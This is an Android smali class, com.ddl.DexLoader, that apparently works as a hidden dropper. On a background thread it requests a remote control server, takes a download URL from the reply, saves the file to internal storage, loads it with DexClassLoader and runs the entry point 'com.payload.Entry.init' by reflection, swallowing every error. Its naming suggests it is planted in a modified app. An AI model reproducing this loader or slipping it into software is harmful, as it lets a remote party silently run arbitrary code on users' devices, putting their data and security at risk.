.class public final Lcom/ddl/DexLoader;
.super Ljava/lang/Object;
.source "DexLoader.java"

.field public static final CONFIG_URL:Ljava/lang/String; = "https://ytpro-control.vercel.app/api/config"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

# load(Context) — spawns background thread
.method public static load(Landroid/content/Context;)V
    .locals 3

    new-instance v0, Lcom/ddl/DexLoader$1;
    invoke-direct {v0, p0}, Lcom/ddl/DexLoader$1;-><init>(Landroid/content/Context;)V

    new-instance v1, Ljava/lang/Thread;
    const-string v2, "ddl-worker"
    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    return-void
.end method

# fetchConfig() — GET config server, parse {"url":"..."}
.method public static fetchConfig()Ljava/lang/String;
    .locals 7

    :try_start_0
    new-instance v0, Ljava/net/URL;
    const-string v1, "https://ytpro-control.vercel.app/api/config"
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;

    const/16 v1, 0x1F40
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    move-result-object v1

    new-instance v2, Ljava/io/BufferedReader;
    new-instance v3, Ljava/io/InputStreamReader;
    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    :read_loop
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v5
    if-eqz v5, :read_done
    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :read_loop

    :read_done
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v5

    # parse {"url":"VALUE"}
    const-string v6, "\"url\":\""
    invoke-virtual {v5, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
    move-result v6

    const/4 v3, -0x1
    if-eq v6, v3, :return_null

    const/4 v3, 0x7
    add-int/2addr v6, v3

    const-string v3, "\""
    invoke-virtual {v5, v3, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I
    move-result v3

    if-le v3, v6, :return_null

    invoke-virtual {v5, v6, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;
    move-result-object v5

    return-object v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :return_null
    const/4 v0, 0x0
    return-object v0

    :catch_0
    move-exception v0
    const/4 v0, 0x0
    return-object v0
.end method

# downloadFile(String url, File dest) — saves to internal storage
.method public static downloadFile(Ljava/lang/String;Ljava/io/File;)V
    .locals 5

    :try_start_0
    new-instance v0, Ljava/net/URL;
    invoke-direct {v0, p0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;

    const/16 v1, 0x3A98
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    const/16 v1, 0x7530
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    move-result-object v1

    new-instance v2, Ljava/io/FileOutputStream;
    invoke-direct {v2, p1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    const/16 v3, 0x1000
    new-array v3, v3, [B

    :copy_loop
    invoke-virtual {v1, v3}, Ljava/io/InputStream;->read([B)I
    move-result v4
    const/4 v0, -0x1
    if-eq v4, v0, :copy_done
    const/4 v0, 0x0
    invoke-virtual {v2, v3, v0, v4}, Ljava/io/OutputStream;->write([BII)V
    goto :copy_loop

    :copy_done
    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0
    # delete partial file on failure
    :try_start_1
    invoke-virtual {p1}, Ljava/io/File;->exists()Z
    move-result v1
    if-eqz v1, :catch_done
    invoke-virtual {p1}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_done
    :catch_done
    return-void
.end method

# execDex(Context, File) — DexClassLoader + reflection invoke
.method public static execDex(Landroid/content/Context;Ljava/io/File;)V
    .locals 7

    :try_start_0
    const-string v0, "ddl_opt"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;
    move-result-object v0

    new-instance v1, Ldalvik/system/DexClassLoader;
    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v3
    const/4 v4, 0x0
    invoke-virtual {p0}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v5
    invoke-direct {v1, v2, v3, v4, v5}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    const-string v2, "com.payload.Entry"
    invoke-virtual {v1, v2}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v2

    const-string v3, "init"
    const/4 v4, 0x1
    new-array v4, v4, [Ljava/lang/Class;
    const/4 v5, 0x0
    const-class v6, Landroid/content/Context;
    aput-object v6, v4, v5
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v3

    const/4 v4, 0x0
    const/4 v5, 0x1
    new-array v5, v5, [Ljava/lang/Object;
    const/4 v6, 0x0
    aput-object p0, v5, v6
    invoke-virtual {v3, v4, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0
    return-void
.end method
